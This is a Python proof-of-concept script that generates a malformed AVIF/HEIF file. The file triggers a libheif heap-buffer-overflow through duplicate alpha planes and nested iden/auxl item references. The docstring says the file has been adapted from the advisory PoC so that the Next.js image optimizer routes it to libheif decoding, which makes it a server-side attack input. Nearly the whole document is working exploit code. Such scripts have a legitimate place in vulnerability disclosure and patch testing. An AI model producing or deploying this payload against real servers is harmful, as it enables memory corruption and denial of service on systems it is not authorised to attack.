#!/usr/bin/env python3
"""
PoC generator for libheif heap-buffer-overflow via duplicate Alpha planes
(GHSA-g89c-p67h-r497, used through Next.js image optimizer GHSA-2xp9-vwfh-vxw4).

Constructs a HEIF file whose nested iden/auxl item graph causes
scale_nearest_neighbor() to write 16-bit samples into an 8-bit Alpha
plane allocation.

Differences from the upstream advisory PoC:
- ftyp major brand is "avif" (compatible brands include "heic"/"mif1"/"miaf")
  so Next.js detectContentType() classifies it as image/avif and routes it
  through sharp/libvips/libheif instead of the BYPASS_TYPES path.
- output file is named poc.avif.

Prerequisites: Python 3.6+, ffmpeg with libx265.
"""

import struct, subprocess, tempfile, os, io

def _generate_hevc(width, height, pix_fmt):
    fd, path = tempfile.mkstemp(suffix=".265")
    os.close(fd)
    try:
        subprocess.run([
            "ffmpeg", "-y", "-f", "lavfi",
            "-i", f"color=c=gray:s={width}x{height}",
            "-frames:v", "1", "-c:v", "libx265",
            "-x265-params", "log-level=0",
            "-pix_fmt", pix_fmt, "-f", "hevc", path,
        ], capture_output=True, check=True)
        with open(path, "rb") as f:
            return f.read()
    finally:
        os.unlink(path)

def _parse_annex_b(data):
    nalus, i = [], 0
    while i < len(data):
        if data[i:i+4] == b"\x00\x00\x00\x01":
            start = i + 4
        elif data[i:i+3] == b"\x00\x00\x01":
            start = i + 3
        else:
            i += 1; continue
        end = len(data)
        j = start
        while j < len(data) - 3:
            if data[j:j+3] == b"\x00\x00\x01":
                end = j
                while end > start and data[end - 1] == 0:
                    end -= 1
                break
            j += 1
        nalus.append(data[start:end])
        i = end
    return nalus

def _nal_type(n): return (n[0] >> 1) & 0x3F

def _split_nalus(raw):
    nalus = _parse_annex_b(raw)
    ps = {"vps": [], "sps": [], "pps": []}
    vcl = []
    for n in nalus:
        t = _nal_type(n)
        if   t == 32: ps["vps"].append(n)
        elif t == 33: ps["sps"].append(n)
        elif t == 34: ps["pps"].append(n)
        elif t <= 31: vcl.append(n)
    return ps, vcl

def _box(tag, p=b""):
    return struct.pack(">I", 8 + len(p)) + tag + p

def _fullbox(tag, ver, flags, p=b""):
    return _box(tag, struct.pack(">I", (ver << 24) | flags) + p)

def _len_prefix(n):
    return struct.pack(">I", len(n)) + n

def _build_hvcc(ps, bpp, chroma):
    sps = ps["sps"][0]
    pb = sps[2] if len(sps) > 2 else 0
    buf = io.BytesIO()
    buf.write(struct.pack("B", 1))
    buf.write(struct.pack("B", ((pb >> 6) & 3) << 6 | ((pb >> 5) & 1) << 5 | (pb & 0x1F)))
    buf.write(b"\x60\x00\x00\x00")
    buf.write(b"\x90\x00\x00\x00\x00\x00")
    buf.write(struct.pack("B", 93))
    buf.write(struct.pack(">H", 0xF000))
    buf.write(struct.pack("B", 0xFC))
    buf.write(struct.pack("B", 0xFC | (chroma & 3)))
    buf.write(struct.pack("B", 0xF8 | ((bpp - 8) & 7)))
    buf.write(struct.pack("B", 0xF8 | ((bpp - 8) & 7)))
    buf.write(struct.pack(">H", 0))
    buf.write(struct.pack("B", 0x0F))
    arrays = []
    for nt, k in [(32, "vps"), (33, "sps"), (34, "pps")]:
        if ps[k]:
            hdr = struct.pack("B", 0x80 | nt) + struct.pack(">H", len(ps[k]))
            body = b"".join(struct.pack(">H", len(n)) + n for n in ps[k])
            arrays.append(hdr + body)
    buf.write(struct.pack("B", len(arrays)))
    for a in arrays: buf.write(a)
    return _box(b"hvcC", buf.getvalue())

def build_poc():
    print("[*] Generating HEVC bitstreams ...")
    raw_8_64  = _generate_hevc(64, 64, "yuv420p")
    raw_10_64 = _generate_hevc(64, 64, "yuv420p10le")
    raw_8_128 = _generate_hevc(128, 128, "yuv420p")

    ps_8_64,  vcl_8_64  = _split_nalus(raw_8_64)
    ps_10_64, vcl_10_64 = _split_nalus(raw_10_64)
    ps_8_128, vcl_8_128 = _split_nalus(raw_8_128)

    d1 = b"".join(_len_prefix(n) for n in vcl_8_64)
    d2 = d1
    d4 = b"".join(_len_prefix(n) for n in vcl_10_64)
    d5 = b"".join(_len_prefix(n) for n in vcl_8_128)

    # major brand "avif" so next.js imageOptimizer routes this to sharp decode
    ftyp = _box(b"ftyp", b"avif" + struct.pack(">I", 0) + b"avifheicmif1miaf")
    mdat = _box(b"mdat", d1 + d2 + d4 + d5)
    base = len(ftyp) + 8
    o1 = base
    o2 = o1 + len(d1)
    o4 = o2 + len(d2)
    o5 = o4 + len(d4)

    hdlr = _fullbox(b"hdlr", 0, 0,
        struct.pack(">I", 0) + b"pict" + b"\x00" * 12 + b"\x00")
    pitm = _fullbox(b"pitm", 0, 0, struct.pack(">H", 5))

    def infe(iid, typ, nm=b""):
        return _fullbox(b"infe", 2, 0,
            struct.pack(">HH", iid, 0) + typ + nm + b"\x00")
    iinf = _fullbox(b"iinf", 0, 0, struct.pack(">H", 5) +
        infe(1, b"hvc1") + infe(2, b"hvc1") + infe(3, b"iden") +
        infe(4, b"hvc1") + infe(5, b"hvc1"))

    def sref(rt, fi, tl):
        return _box(rt, struct.pack(">HH", fi, len(tl)) +
            b"".join(struct.pack(">H", t) for t in tl))
    iref = _fullbox(b"iref", 0, 0,
        sref(b"auxl", 2, [1]) + sref(b"dimg", 3, [1]) +
        sref(b"auxl", 3, [5]) + sref(b"auxl", 4, [3]))

    ispe64  = _fullbox(b"ispe", 0, 0, struct.pack(">II", 64, 64))
    ispe128 = _fullbox(b"ispe", 0, 0, struct.pack(">II", 128, 128))
    h3 = _build_hvcc(ps_8_64, 8, 1)
    h4 = _build_hvcc(ps_10_64, 10, 1)
    h5 = _build_hvcc(ps_8_128, 8, 1)
    auxc = _fullbox(b"auxC", 0, 0,
        b"urn:mpeg:mpegB:cicp:systems:auxiliary:alpha\x00")
    ipco = _box(b"ipco", ispe64 + ispe128 + h3 + h4 + h5 + auxc)

    def ipma_e(iid, al):
        return struct.pack(">HB", iid, len(al)) + \
            b"".join(struct.pack("B", ((1 if e else 0) << 7) | (i & 0x7F))
                     for e, i in al)
    ipma = _fullbox(b"ipma", 0, 0, struct.pack(">I", 5) +
        ipma_e(1, [(1,1),(1,3)]) +
        ipma_e(2, [(1,1),(1,3),(1,6)]) +
        ipma_e(3, [(1,1),(1,6)]) +
        ipma_e(4, [(1,1),(1,4),(1,6)]) +
        ipma_e(5, [(1,2),(1,5)]))
    iprp = _box(b"iprp", ipco + ipma)

    def iloc_i(iid, off, ln):
        return struct.pack(">HHHII", iid, 0, 1, off, ln)
    def iloc_e(iid):
        return struct.pack(">HHH", iid, 0, 0)
    iloc = _fullbox(b"iloc", 0, 0,
        struct.pack("BB", 0x44, 0x00) + struct.pack(">H", 5) +
        iloc_i(1, o1, len(d1)) + iloc_i(2, o2, len(d2)) +
        iloc_e(3) + iloc_i(4, o4, len(d4)) + iloc_i(5, o5, len(d5)))

    meta = _fullbox(b"meta", 0, 0, hdlr + pitm + iinf + iref + iprp + iloc)
    return ftyp + mdat + meta

if __name__ == "__main__":
    with open("poc.avif", "wb") as f:
        f.write(build_poc())
    print("[+] Written poc.avif")
